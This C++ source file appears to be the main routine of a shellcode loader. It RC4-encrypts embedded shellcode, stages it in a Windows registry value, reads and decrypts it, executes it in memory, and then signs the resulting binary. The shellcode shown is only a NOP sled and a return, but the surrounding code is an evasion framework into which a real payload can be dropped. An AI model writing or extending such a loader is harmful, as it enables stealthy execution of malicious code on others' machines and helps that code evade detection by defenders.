#include "config.h"
#include "rc4.h"
#include "binary_signer.h"
#include "registry_utils.h"
#include "shellcode_handler.h"
#include "write_payload.h"  // Include the new file
#include <iostream>
#include <vector>
//test
unsigned char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90"  // NOP sled (doing nothing)
"\xc3";

int main() {
    std::string registryKey = config::registryKey;
    std::string valueName = config::valueName;

    // Step 1: Verbose output about the shellcode size
    std::cout << "[DEBUG] Shellcode size: " << sizeof(shellcode) << " bytes" << std::endl;

    // Step 2: Convert the embedded shellcode to a vector
    std::vector<uint8_t> shellcodeVector(shellcode, shellcode + sizeof(shellcode));
    std::cout << "[DEBUG] Shellcode vector created with size: " << shellcodeVector.size() << std::endl;

    // Step 3: Encrypt the shellcode and provide verbose output
    RC4EncryptDecrypt(shellcodeVector, config::encryptionKey);
    std::cout << "[DEBUG] Shellcode encrypted.\n";

    // Step 4: Write the encrypted shellcode to the Windows registry
    if (WriteShellcodeToRegistry(registryKey, valueName, shellcodeVector.data(), shellcodeVector.size())) {
        std::cout << "[DEBUG] Encrypted shellcode written to registry successfully.\n";
    }
    else {
        std::cerr << "[ERROR] Failed to write shellcode to registry.\n";
        return 1;
    }

    // Step 5: Read the encrypted shellcode from the registry
    BYTE* pPayload = NULL;
    if (!ReadShellcodeFromRegistry(shellcodeVector.size(), &pPayload)) {
        std::cerr << "[ERROR] Failed to read shellcode from registry.\n";
        return 1;
    }
    std::cout << "[DEBUG] Shellcode read from registry successfully.\n";

    // Step 6: Decrypt the shellcode and log the action
    std::vector<uint8_t> decryptedShellcode(pPayload, pPayload + shellcodeVector.size());
    RC4EncryptDecrypt(decryptedShellcode, config::encryptionKey);  // Decrypt using the same key
    std::cout << "[DEBUG] Shellcode decrypted.\n";

    // Step 7: Execute the shellcode and add logging for execution status
    if (!RunShellcode(decryptedShellcode.data(), decryptedShellcode.size())) {
        std::cerr << "[ERROR] Failed to execute shellcode.\n";
        HeapFree(GetProcessHeap(), 0, pPayload);
        return 1;
    }
    std::cout << "[DEBUG] Shellcode executed.\n";

    // Step 8: Clean up allocated memory
    HeapFree(GetProcessHeap(), 0, pPayload);
    std::cout << "[DEBUG] Memory cleaned up.\n";

    // Step 9: Optionally sign the binary executable
    if (SignBinary(config::binaryFilePath)) {
        std::cout << "[DEBUG] Binary signed successfully.\n";
    }
    else {
        std::cerr << "[ERROR] Failed to sign binary.\n";
    }

    return 0;
}